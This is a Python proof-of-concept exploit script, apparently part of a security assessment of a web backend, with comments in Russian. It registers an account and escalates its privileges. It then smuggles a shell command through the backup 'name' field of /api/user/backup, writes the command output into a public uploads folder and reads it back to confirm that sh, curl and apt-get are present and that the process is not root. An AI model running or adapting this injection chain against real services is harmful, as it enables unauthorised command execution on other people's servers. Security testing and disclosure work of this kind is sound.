# -*- coding: utf-8 -*-
"""В runtime-образе остаются sh, curl и apt-get, процесс не root.
Без sh команда в backup не из чего запускать: туда передаётся sh -c.

    python 07_shell_in_image.py
"""
import time

from _http import Client, parser


def main():
    args = parser("Оболочка и утилиты в образе backend").parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    name = f"sh{stamp}"
    email = f"{name}@poc.local"
    password = "Passw0rd!shell"
    token = client.register(name, email, password)
    token = client.promote(token, name, email, password)

    outfile = f"tools-{stamp}.txt"
    payload = (
        "x; { command -v sh; command -v curl; command -v apt-get; id; } "
        f"> /srv/media/uploads/{outfile} #"
    )
    status, _, blob = client.call(
        "POST",
        "/api/user/backup",
        token=token,
        body={"backup": {"name": payload}},
    )
    if status != 200:
        raise SystemExit(f"backup не выполнился: {status} {blob[:300]!r}")

    status, _, body = client.call("GET", f"/uploads/{outfile}")
    text = body.decode("utf-8", "replace")
    if status != 200 or "/sh" not in text or "uid=" not in text:
        raise SystemExit(f"вывод утилит не получен: {status} {text[:200]!r}")
    if "uid=0" in text:
        raise SystemExit("процесс неожиданно root:\n" + text)
    print("OK")
    print(text.strip())


if __name__ == "__main__":
    main()
